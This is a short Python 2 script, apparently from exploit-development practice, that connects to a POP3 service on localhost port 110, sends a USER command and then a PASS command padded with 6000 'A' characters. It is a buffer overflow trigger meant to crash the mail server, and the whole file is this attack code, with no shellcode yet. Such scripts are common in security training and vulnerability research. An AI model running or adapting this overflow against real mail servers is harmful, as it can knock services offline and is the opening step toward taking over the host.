import sys
import socket

buffer = 'A' * 6000
HOST = '127.0.0.1'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
print 'Received', repr(data)
s.send('USER username'+'\r\n')
data = s.recv(1024)
print 'Received', repr(data)
s.send('PASS ' + buffer + '\r\n')
s.close()